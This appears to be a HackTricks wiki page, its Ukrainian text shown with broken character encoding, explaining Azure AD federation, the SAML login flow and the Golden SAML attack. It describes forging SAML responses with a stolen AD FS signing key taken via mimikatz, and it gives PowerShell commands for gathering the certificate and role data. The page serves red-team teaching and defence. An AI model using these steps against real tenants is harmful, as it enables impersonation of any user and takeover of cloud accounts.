# Az - Federation

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ —É **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –ø–æ–¥–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

[–ó –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federation** - —Ü–µ –∫–æ–ª–µ–∫—Ü—ñ—è **–¥–æ–º–µ–Ω—ñ–≤**, —è–∫—ñ –≤—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ **–¥–æ–≤—ñ—Ä—É**. –†—ñ–≤–µ–Ω—å –¥–æ–≤—ñ—Ä–∏ –º–æ–∂–µ –≤–∞—Ä—ñ—é–≤–∞—Ç–∏—Å—è, –∞–ª–µ –∑–∞–∑–≤–∏—á–∞–π –≤–∫–ª—é—á–∞—î **–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é** —ñ –º–∞–π–∂–µ –∑–∞–≤–∂–¥–∏ –≤–∫–ª—é—á–∞—î **–∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é**. –¢–∏–ø–æ–≤–∞ —Ñ–µ–¥–µ—Ä–∞—Ü—ñ—è –º–æ–∂–µ –≤–∫–ª—é—á–∞—Ç–∏ **–∫—ñ–ª—å–∫–∞ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ–π**, —è–∫—ñ –≤—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ **–¥–æ–≤—ñ—Ä—É** –¥–ª—è **—Å–ø—ñ–ª—å–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É** –¥–æ –Ω–∞–±–æ—Ä—É —Ä–µ—Å—É—Ä—Å—ñ–≤.

–í–∏ –º–æ–∂–µ—Ç–µ **—Ñ–µ–¥–µ—Ä–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –≤–∞—à–µ –ª–æ–∫–∞–ª—å–Ω–µ** —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ **–∑ Azure AD** —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—é —Ñ–µ–¥–µ—Ä–∞—Ü—ñ—é –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ç–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó. –¶–µ–π –º–µ—Ç–æ–¥ –≤—Ö–æ–¥—É –∑–∞–±–µ–∑–ø–µ—á—É—î, —â–æ –≤—Å—è **–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –ª–æ–∫–∞–ª—å–Ω–æ**. –¶–µ–π –º–µ—Ç–æ–¥ –¥–æ–∑–≤–æ–ª—è—î –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º –≤–ø—Ä–æ–≤–∞–¥–∂—É–≤–∞—Ç–∏ –±—ñ–ª—å—à —Å—É–≤–æ—Ä—ñ —Ä—ñ–≤–Ω—ñ –∫–æ–Ω—Ç—Ä–æ–ª—é –¥–æ—Å—Ç—É–ø—É. –§–µ–¥–µ—Ä–∞—Ü—ñ—è –∑ **AD FS** —Ç–∞ PingFederate –¥–æ—Å—Ç—É–ø–Ω–∞.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

–í –æ—Å–Ω–æ–≤–Ω–æ–º—É, —É Federation –≤—Å—è **–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è** –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –≤ **–ª–æ–∫–∞–ª—å–Ω–æ–º—É** —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ, —ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –≤—ñ–¥—á—É–≤–∞—é—Ç—å SSO —É –≤—Å—ñ—Ö –¥–æ–≤—ñ—Ä–µ–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –º–æ–∂—É—Ç—å **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø** –¥–æ **—Ö–º–∞—Ä–Ω–∏—Ö** –¥–æ–¥–∞—Ç–∫—ñ–≤, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–≤–æ—ó **–ª–æ–∫–∞–ª—å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**.

**Security Assertion Markup Language (SAML)** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è **–æ–±–º—ñ–Ω—É** –≤—Å—ñ—î—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –ø—Ä–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é —Ç–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é –º—ñ–∂ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞–º–∏.

–£ –±—É–¥—å-—è–∫–æ–º—É –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—ñ —Ñ–µ–¥–µ—Ä–∞—Ü—ñ—ó —î —Ç—Ä–∏ —Å—Ç–æ—Ä–æ–Ω–∏:

* –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á –∞–±–æ –∫–ª—ñ—î–Ω—Ç
* Identity Provider (IdP)
* Service Provider (SP)

(–ó–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∑ https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. –°–ø–æ—á–∞—Ç–∫—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ –¥–æ–¥–∞—Ç–∫—É (Service Provider –∞–±–æ SP, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, AWS console –∞–±–æ vSphere web client). –¶–µ–π –∫—Ä–æ–∫ –º–æ–∂–µ –±—É—Ç–∏ –ø—Ä–æ–ø—É—â–µ–Ω–∏–π, —â–æ –ø—Ä–∏–∑–≤–µ–¥–µ –∫–ª—ñ—î–Ω—Ç–∞ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –¥–æ IdP (Identity Provider) –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó.
2. –ü–æ—Ç—ñ–º SP —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π IdP (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, AD FS, Okta) –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –í—ñ–Ω —Å—Ç–≤–æ—Ä—é—î SAML (Security Assertion Markup Language) AuthnRequest —ñ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î –∫–ª—ñ—î–Ω—Ç–∞ –¥–æ –æ–±—Ä–∞–Ω–æ–≥–æ IdP.
3. IdP –±–µ—Ä–µ –Ω–∞ —Å–µ–±–µ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –ü—ñ—Å–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó IdP —Ñ–æ—Ä–º—É—î SAMLResponse —ñ –ø–µ—Ä–µ–¥–∞—î –π–æ–≥–æ SP —á–µ—Ä–µ–∑ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
4. –ù–∞—Ä–µ—à—Ç—ñ, SP –æ—Ü—ñ–Ω—é—î SAMLResponse. –Ø–∫—â–æ –≤—ñ–Ω —É—Å–ø—ñ—à–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–∏–π, —â–æ –æ–∑–Ω–∞—á–∞—î –¥–æ–≤—ñ—Ä—á—ñ –≤—ñ–¥–Ω–æ—Å–∏–Ω–∏ –∑ IdP, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø. –¶–µ –∑–∞–≤–µ—Ä—à—É—î –ø—Ä–æ—Ü–µ—Å –≤—Ö–æ–¥—É, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Å–µ—Ä–≤—ñ—Å.

**–Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ SAML –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é —Ç–∞ –ø–æ—à–∏—Ä–µ–Ω—ñ –∞—Ç–∞–∫–∏, –ø–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS - —Ü–µ –º–æ–¥–µ–ª—å —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –Ω–∞ –æ—Å–Ω–æ–≤—ñ claims.
* "..claims - —Ü–µ –ø—Ä–æ—Å—Ç–æ –∑–∞—è–≤–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —ñ–º'—è, —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å, –≥—Ä—É–ø–∞), –∑—Ä–æ–±–ª–µ–Ω—ñ –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –¥–æ—Å—Ç—É–ø—É –¥–æ –¥–æ–¥–∞—Ç–∫—ñ–≤ –Ω–∞ –æ—Å–Ω–æ–≤—ñ claims, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏—Ö –±—É–¥—å-–¥–µ –≤ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ."
* Claims –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑–∞–ø–∏—Å—É—é—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ SAML —Ç–æ–∫–µ–Ω—ñ–≤ —ñ –ø—ñ–¥–ø–∏—Å—É—é—Ç—å—Å—è –¥–ª—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–¥–µ–Ω—Ü—ñ–π–Ω–æ—Å—Ç—ñ IdP.
* –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î—Ç—å—Å—è –∑–∞ ImmutableID. –í—ñ–Ω —î –≥–ª–æ–±–∞–ª—å–Ω–æ —É–Ω—ñ–∫–∞–ª—å–Ω–∏–º —ñ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤ Azure AD.
* ImmutableID –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –ª–æ–∫–∞–ª—å–Ω–æ —è–∫ ms-DS-ConsistencyGuid –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —ñ/–∞–±–æ –º–æ–∂–µ –±—É—Ç–∏ –æ—Ç—Ä–∏–º–∞–Ω–∏–π –∑ GUID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
* –ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –Ω–∞ [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML –∞—Ç–∞–∫–∞:**

* –£ ADFS, SAML Response –ø—ñ–¥–ø–∏—Å—É—î—Ç—å—Å—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º –ø—ñ–¥–ø–∏—Å—É —Ç–æ–∫–µ–Ω—ñ–≤.
* –Ø–∫—â–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π, –º–æ–∂–ª–∏–≤–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏—Å—è –≤ Azure AD —è–∫ –ë–£–î–¨-–Ø–ö–ò–ô –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–æ–≤–∞–Ω–∏–π –∑ Azure AD!
* –Ø–∫ —ñ —É –≤–∏–ø–∞–¥–∫—É –∑ –Ω–∞—à–∏–º –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è–º PTA, –∑–º—ñ–Ω–∞ –ø–∞—Ä–æ–ª—è –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ MFA –Ω–µ –º–∞—Ç–∏–º–µ –∂–æ–¥–Ω–æ–≥–æ –µ—Ñ–µ–∫—Ç—É, –æ—Å–∫—ñ–ª—å–∫–∏ –º–∏ –ø—ñ–¥—Ä–æ–±–ª—è—î–º–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó.
* –°–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –º–æ–∂–Ω–∞ –≤–∏—Ç—è–≥—Ç–∏ –∑ —Å–µ—Ä–≤–µ—Ä–∞ AD FS –∑ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ DA —ñ –ø–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑ –±—É–¥—å-—è–∫–æ—ó –º–∞—à–∏–Ω–∏, –ø—ñ–¥–∫–ª—é—á–µ–Ω–æ—ó –¥–æ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É.
* –ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –Ω–∞ [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

–ü—Ä–æ—Ü–µ—Å, –∫–æ–ª–∏ **Identity Provider (IdP)** —Å—Ç–≤–æ—Ä—é—î **SAMLResponse** –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –≤—Ö–æ–¥—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —î –Ω–∞–¥–∑–≤–∏—á–∞–π–Ω–æ –≤–∞–∂–ª–∏–≤–∏–º. –ó–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó IdP, **–≤—ñ–¥–ø–æ–≤—ñ–¥—å** –º–æ–∂–µ –±—É—Ç–∏ **–ø—ñ–¥–ø–∏—Å–∞–Ω–∞** –∞–±–æ **–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∞** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞ IdP**. –¶—è –ø—Ä–æ—Ü–µ–¥—É—Ä–∞ –¥–æ–∑–≤–æ–ª—è—î **Service Provider (SP)** –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –∞–≤—Ç–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å SAMLResponse, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏, —â–æ –≤—ñ–Ω –¥—ñ–π—Å–Ω–æ –±—É–≤ –≤–∏–¥–∞–Ω–∏–π –¥–æ–≤—ñ—Ä–µ–Ω–∏–º IdP.

–ú–æ–∂–Ω–∞ –ø—Ä–æ–≤–µ—Å—Ç–∏ –ø–∞—Ä–∞–ª–µ–ª—å –∑ [golden ticket attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket), –¥–µ –∫–ª—é—á, —â–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å —ñ –ø—Ä–∞–≤–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (KRBTGT –¥–ª—è golden tickets, –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á –ø—ñ–¥–ø–∏—Å—É —Ç–æ–∫–µ–Ω—ñ–≤ –¥–ª—è golden SAML), –º–æ–∂–µ –±—É—Ç–∏ –º–∞–Ω—ñ–ø—É–ª—å–æ–≤–∞–Ω–∏–π –¥–ª—è **–ø—ñ–¥—Ä–æ–±–∫–∏ –æ–±'—î–∫—Ç–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó** (TGT –∞–±–æ SAMLResponse). –¶–µ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–¥–∞–≤–∞—Ç–∏ —Å–µ–±–µ –∑–∞ –±—É–¥—å-—è–∫–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –Ω–∞–¥–∞—é—á–∏ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ SP.

Golden SAML –º–∞—î –ø–µ–≤–Ω—ñ –ø–µ—Ä–µ–≤–∞–≥–∏:

* –á—Ö –º–æ–∂–Ω–∞ **—Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ**, –±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ –±—É—Ç–∏ —á–∞—Å—Ç–∏–Ω–æ—é –¥–æ–º–µ–Ω—É –∞–±–æ —Ñ–µ–¥–µ—Ä–∞—Ü—ñ—ó.
* –í–æ–Ω–∏ –∑–∞–ª–∏—à–∞—é—Ç—å—Å—è –µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–º–∏ –Ω–∞–≤—ñ—Ç—å –ø—Ä–∏ **—É–≤—ñ–º–∫–Ω–µ–Ω—ñ–π –¥–≤–æ—Ñ–∞–∫—Ç–æ—Ä–Ω—ñ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó (2FA)**.
* –ü—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á –ø—ñ–¥–ø–∏—Å—É —Ç–æ–∫–µ–Ω—ñ–≤ **–Ω–µ –æ–Ω–æ–≤–ª—é—î—Ç—å—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ**.
* **–ó–º—ñ–Ω–∞ –ø–∞—Ä–æ–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –Ω–µ –∞–Ω—É–ª—é—î** –≤–∂–µ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π SAML.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) - —Ü–µ —Å–µ—Ä–≤—ñ—Å Microsoft, —è–∫–∏–π —Å–ø—Ä–∏—è—î **–±–µ–∑–ø–µ—á–Ω–æ–º—É –æ–±–º—ñ–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –ø—Ä–æ —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å** –º—ñ–∂ –¥–æ–≤—ñ—Ä–µ–Ω–∏–º–∏ –±—ñ–∑–Ω–µ—Å-–ø–∞—Ä—Ç–Ω–µ—Ä–∞–º–∏ (—Ñ–µ–¥–µ—Ä–∞—Ü—ñ—è). –í—ñ–Ω —Ñ–∞–∫—Ç–∏—á–Ω–æ –¥–æ–∑–≤–æ–ª—è—î –¥–æ–º–µ–Ω–Ω–æ–º—É —Å–µ—Ä–≤—ñ—Å—É –¥—ñ–ª–∏—Ç–∏—Å—è —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—è–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ —ñ–Ω—à–∏–º–∏ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞–º–∏ –ø–æ—Å–ª—É–≥ —É —Ñ–µ–¥–µ—Ä–∞—Ü—ñ—ó.

–ó AWS, —â–æ –¥–æ–≤—ñ—Ä—è—î —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–º—É –¥–æ–º–µ–Ω—É (—É —Ñ–µ–¥–µ—Ä–∞—Ü—ñ—ó), —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –¥–ª—è –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ–≥–æ **–æ—Ç—Ä–∏–º–∞–Ω–Ω—è –±—É–¥—å-—è–∫–∏—Ö –ø—Ä–∞–≤ —É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ AWS**. –ê—Ç–∞–∫–∞ –≤–∏–º–∞–≥–∞—î **–ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø—ñ–¥–ø–∏—Å—É SAML –æ–±'—î–∫—Ç—ñ–≤**, –ø–æ–¥—ñ–±–Ω–æ –¥–æ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ KRBTGT —É golden ticket –∞—Ç–∞—Ü—ñ. –î–æ—Å—Ç—É–ø –¥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ AD FS –¥–æ—Å—Ç–∞—Ç–Ω—ñ–π –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ü—å–æ–≥–æ –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞.

–í–∏–º–æ–≥–∏ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∞—Ç–∞–∫–∏ golden SAML –≤–∫–ª—é—á–∞—é—Ç—å:

* **–ü—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á –ø—ñ–¥–ø–∏—Å—É —Ç–æ–∫–µ–Ω—ñ–≤**
* **–ü—É–±–ª—ñ—á–Ω–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç IdP**
* **–Ü–º'—è IdP**
* **–Ü–º'—è —Ä–æ–ª—ñ (—Ä–æ–ª—å –¥–ª—è –ø—Ä–∏–π–Ω—è—Ç—Ç—è)**
* –î–æ–º–µ–Ω\—ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞
* –Ü–º'—è —Å–µ—Å—ñ—ó —Ä–æ–ª—ñ –≤ AWS
* –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É Amazon

_–¢—ñ–ª—å–∫–∏ –µ–ª–µ–º–µ–Ω—Ç–∏, –≤–∏–¥—ñ–ª–µ–Ω—ñ –∂–∏—Ä–Ω–∏–º —à—Ä–∏—Ñ—Ç–æ–º, —î –æ–±–æ–≤'—è–∑–∫–æ–≤–∏–º–∏. –Ü–Ω—à—ñ –º–æ–∂–Ω–∞ –∑–∞–ø–æ–≤–Ω–∏—Ç–∏ –∑–∞ –±–∞–∂–∞–Ω–Ω—è–º._

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **–ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞** –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ **–æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ AD FS**. –ó–≤—ñ–¥—Ç–∏ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á –º–æ–∂–Ω–∞ **–µ–∫—Å–ø–æ—Ä—Ç—É–≤–∞—Ç–∏ –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —Å—Ö–æ–≤–∏—â–∞** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–∞–∫–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤, —è–∫ [mimikatz](https://github.com/gentilkiwi/mimikatz). –î–ª—è –∑–±–æ—Ä—É —ñ–Ω—à–æ—ó –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ Microsoft.Adfs.Powershell snapin –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º, –ø–µ—Ä–µ–∫–æ–Ω–∞–≤—à–∏—Å—å, —â–æ –≤–∏ —É–≤—ñ–π—à–ª–∏ —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á ADFS:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
